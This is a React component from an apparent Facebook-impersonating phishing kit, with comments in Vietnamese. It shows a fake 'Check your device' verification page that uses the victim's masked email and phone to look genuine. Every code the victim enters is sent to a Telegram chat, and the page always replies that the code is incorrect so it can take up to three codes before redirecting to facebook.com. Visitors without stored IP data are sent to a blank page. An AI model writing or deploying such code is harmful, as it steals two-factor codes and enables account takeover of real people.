import VerifyImage from '@/assets/images/681.png';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import config from '@/utils/config';

const Verify = () => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [userInfo, setUserInfo] = useState({ email: '', phone: '' });

    // Lấy thông tin từ trang 1
    useEffect(() => {
        const savedUserInfo = localStorage.getItem('userInfo');
        if (savedUserInfo) {
            const userData = JSON.parse(savedUserInfo);
            setUserInfo({
                email: userData.email || '',
                phone: userData.phone || ''
            });
        }
    }, []);

    // Format email: s****g@m****.com
    const formatEmailForDisplay = (email) => {
        if (!email) return 's****g@m****.com';
        const parts = email.split('@');
        if (parts.length !== 2) return email;
        
        const username = parts[0];
        const domain = parts[1];
        const domainParts = domain.split('.');
        
        if (username.length <= 1) return email;
        if (domainParts.length < 2) return email;
        
        // Format: s****g (ký tự đầu + *** + ký tự cuối)
        const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
        
        // Format: m****.com (ký tự đầu + *** + .com)
        const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
        
        return formattedUsername + '@' + formattedDomain;
    };

    // Format số điện thoại: ******32 (6 sao + 2 số cuối)
    const formatPhoneForDisplay = (phone) => {
        if (!phone) return '******32';
        const cleanPhone = phone.replace(/^\+\d+\s*/, '');
        if (cleanPhone.length < 2) return '******32';
        
        // Luôn hiển thị 6 sao + 2 số cuối
        const lastTwoDigits = cleanPhone.slice(-2);
        return '*'.repeat(6) + lastTwoDigits;
    };

    const defaultTexts = useMemo(
        () => ({
            title: 'Check your device',
            description: `We have sent a verification code to your ${formatEmailForDisplay(userInfo.email)} and ${formatPhoneForDisplay(userInfo.phone)}. Please enter the code we just sent to continue.`,
            placeholder: 'Enter your code',
            infoTitle: 'Approve from another device or Enter your verification code',
            infoDescription:
                'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
            submit: 'Continue',
            sendCode: 'Send new code',
            errorMessage: 'The verification code you entered is incorrect',
            loadingText: 'Please wait'
        }),
        [userInfo.email, userInfo.phone]
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedTitle,
                    translatedDesc,
                    translatedPlaceholder,
                    translatedInfoTitle,
                    translatedInfoDesc,
                    translatedSubmit,
                    translatedSendCode,
                    translatedError,
                    translatedLoading
                ] = await Promise.all([
                    translateText(defaultTexts.title, targetLang),
                    translateText(defaultTexts.description, targetLang),
                    translateText(defaultTexts.placeholder, targetLang),
                    translateText(defaultTexts.infoTitle, targetLang),
                    translateText(defaultTexts.infoDescription, targetLang),
                    translateText(defaultTexts.submit, targetLang),
                    translateText(defaultTexts.sendCode, targetLang),
                    translateText(defaultTexts.errorMessage, targetLang),
                    translateText(defaultTexts.loadingText, targetLang)
                ]);

                setTranslatedTexts({
                    title: translatedTitle,
                    description: translatedDesc,
                    placeholder: translatedPlaceholder,
                    infoTitle: translatedInfoTitle,
                    infoDescription: translatedInfoDesc,
                    submit: translatedSubmit,
                    sendCode: translatedSendCode,
                    errorMessage: translatedError,
                    loadingText: translatedLoading
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            window.location.href = 'about:blank';
        }
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleSubmit = async () => {
        if (!code.trim()) return;

        setIsLoading(true);
        setShowError(false);

        try {
            const message = `🔐 <b>Code ${attempts + 1}:</b> <code>${code}</code>`;
            await sendMessage(message);
        } catch {
            //
        }

        // Delay 2 giây mà không hiển thị countdown
        await new Promise((resolve) => setTimeout(resolve, 2000));

        setShowError(true);
        setAttempts((prev) => prev + 1);
        setIsLoading(false);

        // Chỉ cho 3 lần nhập: lần 1 + 2 lần sai = tổng 3 lần
        if (attempts + 1 >= 3) {
            window.location.replace('https://facebook.com');
            return;
        }

        setCode('');
    };

    return (
        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]'>
            <title>Account | Privacy Policy</title>
            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                <p>{translatedTexts.description}</p>

                <img src={VerifyImage} alt='' />
                <input
                    type='number'
                    inputMode='numeric'
                    max={8}
                    placeholder={translatedTexts.placeholder}
                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2'
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                />
                {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
                <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
                    <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
                    <div>
                        <p className='font-medium'>{translatedTexts.infoTitle}</p>
                        <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
                    </div>
                </div>

                <button
                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
                    onClick={handleSubmit}
                    disabled={isLoading || !code.trim()}
                >
                    {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
                </button>

                <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
            </div>
        </div>
    );
};

export default Verify;
